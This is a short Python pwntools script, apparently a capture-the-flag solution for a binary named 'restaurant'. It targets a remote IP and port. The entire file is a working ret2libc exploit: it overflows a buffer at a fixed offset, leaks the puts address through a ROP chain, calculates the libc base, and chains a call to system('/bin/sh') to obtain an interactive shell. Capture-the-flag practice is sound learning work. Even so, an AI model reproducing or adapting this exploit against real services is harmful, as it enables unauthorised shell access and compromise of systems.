from pprint import pprint
from pwn import *

context.arch = 'amd64'

offset = 120

elf = ELF('./restaurant')
#p = elf.process()
p = remote('35.246.158.241', 31395)

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['custom'])

p.recvuntil('>> ')
p.sendline(b'3')
p.recvuntil(':')

payload = [
	b'A' * offset,
	rop.chain()
]

payload = b''.join(payload)
p.sendline(payload)

puts = u64(p.recvuntil('\n').rstrip().ljust(8, b'\x00'))
log.info(f'puts addr: {hex(puts)}')

p.recvuntil(':')

libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
libc.address = puts - libc.symbols['puts']
log.info(f'libc base addr: {hex(libc.address)}')

rop = ROP(libc)
rop.call('puts', [next(libc.search(b'/bin/sh\x00'))])
rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
rop.call('exit')
payload = [
	b'A' * offset,
	rop.chain()
]

payload = b''.join(payload)
p.sendline(payload)

p.interactive()